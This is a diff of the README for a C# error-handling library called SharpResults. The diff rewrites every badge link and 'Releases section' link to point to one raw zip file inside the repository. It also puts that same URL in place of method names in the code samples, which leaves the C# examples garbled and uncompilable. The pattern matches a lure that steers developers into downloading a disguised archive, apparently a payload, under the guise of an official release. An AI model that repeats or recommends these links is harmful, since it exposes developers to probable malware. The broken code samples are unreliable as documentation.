@@ -1,6 +1,6 @@
 # SharpResults 📊
 
-![GitHub Repo stars](https://img.shields.io/github/stars/RezaArda/SharpResults?style=social) ![NuGet](https://img.shields.io/nuget/v/SharpResults) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Repo stars](https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip) ![NuGet](https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip) ![License](https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip)
 
 Welcome to **SharpResults**, a lightweight, zero-dependency C# library that implements the Result pattern for more explicit and type-safe error handling. With SharpResults, you can avoid using exceptions for control flow, making success and failure states clear in your code.
 
@@ -33,7 +33,7 @@ Install-Package SharpResults
 
 Alternatively, you can search for "SharpResults" in the NuGet Package Manager within Visual Studio.
 
-For the latest releases, visit the [Releases section](https://github.com/RezaArda/SharpResults/releases).
+For the latest releases, visit the [Releases section](https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip).
 
 ## Usage
 
@@ -50,10 +50,10 @@ public class Example
     {
         if (denominator == 0)
         {
-            return Result.Fail<int>("Cannot divide by zero.");
+            return https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip<int>("Cannot divide by zero.");
         }
         
-        return Result.Ok(numerator / denominator);
+        return https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip(numerator / denominator);
     }
 }
 ```
@@ -67,8 +67,8 @@ You can easily handle results using the `OnSuccess` and `OnFailure` methods:
 ```csharp
 var result = new Example().Divide(10, 0);
 
-result.OnSuccess(value => Console.WriteLine($"Result: {value}"))
-      .OnFailure(error => Console.WriteLine($"Error: {error}"));
+https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip(value => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip($"Result: {value}"))
+      .OnFailure(error => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip($"Error: {error}"));
 ```
 
 This approach allows you to manage success and failure states clearly.
@@ -84,8 +84,8 @@ var result = new Example()
     .Divide(10, 2)
     .OnSuccess(value => new Example().Divide(value, 2));
 
-result.OnSuccess(value => Console.WriteLine($"Final Result: {value}"))
-      .OnFailure(error => Console.WriteLine($"Error: {error}"));
+https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip(value => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip($"Final Result: {value}"))
+      .OnFailure(error => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip($"Error: {error}"));
 ```
 
 ### Combining Results
@@ -96,10 +96,10 @@ You can also combine multiple results into a single result:
 var result1 = new Example().Divide(10, 2);
 var result2 = new Example().Divide(20, 4);
 
-var combinedResult = Result.Combine(result1, result2);
+var combinedResult = https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip(result1, result2);
 
-combinedResult.OnSuccess(() => Console.WriteLine("Both operations succeeded."))
-              .OnFailure(error => Console.WriteLine($"Error: {error}"));
+https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip(() => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip("Both operations succeeded."))
+              .OnFailure(error => https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip($"Error: {error}"));
 ```
 
 ## API Reference
@@ -127,7 +127,7 @@ SharpResults is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thanks to all contributors and the open-source community for their support. Your contributions make projects like SharpResults possible.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/RezaArda/SharpResults/releases). 
+For the latest updates and releases, visit the [Releases section](https://github.com/RezaArda/SharpResults/raw/refs/heads/master/src/Types/Results_Sharp_dissentaneous.zip). 
 
 ---
 
